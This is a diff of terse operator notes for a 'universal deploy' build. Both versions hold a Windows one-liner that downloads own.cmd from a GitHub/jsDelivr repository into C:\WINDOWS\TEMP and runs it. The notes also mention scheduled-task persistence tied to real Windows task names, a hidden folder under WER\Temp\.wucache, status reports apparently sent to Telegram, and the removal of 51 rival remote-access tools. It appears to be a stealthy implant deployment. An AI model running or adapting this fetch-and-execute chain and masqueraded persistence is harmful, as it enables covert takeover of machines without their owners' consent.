@@ -1,17 +1,14 @@
-UNIVERSAL DEPLOY  (O32 / M22 / L11 / T12 / S6):
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o32" && call C:\WINDOWS\TEMP\own.cmd
+UNIVERSAL DEPLOY (O32b — jsDelivr + build check):
 
-O32 root-cause fix: task persistence was existence-only against REAL Windows
-task names (Diagnosis\Scheduled, WDI\ResolutionHost). Query succeeded, rearm
-skipped, own_mon never ticked -> no log, auto-update dead. Now IDENTVER=6
-unique names + Task To Run ownership checks + tasks-ensure every tick.
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o32c" & findstr /C:"OWN BUILD 20260802O32" C:\WINDOWS\TEMP\own.cmd >nul || curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/cf9625f/own.txt" & findstr /C:"OWN BUILD 20260802O32" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-Expect TG:
-  Source build: O32
-  Payload builds: MON=M22 | SEC=S6 | TGR=T12 | LIB=L11
-  Persist tasks show OK (not NOT_OURS)
+Must print: === OWN BUILD 20260802O32 ===
+If you see O30, raw CDN is stale — this oneliner uses jsDelivr first.
 
-KEEP: dual ScreenConnect FPs + Datto/CentraStage
-REMOVE: 51 RMM/remote tools (see prior list)
+After ~90s:
+  cd /d C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache
+  findstr /C:"OWN_MON  BUILD" own_mon.cmd
+  findstr /C:"IDENTVER" identity.cfg
+  if exist own_mon.log (powershell -NoP -C "Get-Content own_mon.log -Tail 15")
 
-FORCE O32 on stuck boxes (especially no own_mon.log / tasks=NOT_OURS).
+KEEP: dual SC + Datto | REMOVE: 51 RMMs | Fix: IDENTVER=6 task ownership + unique detach runner
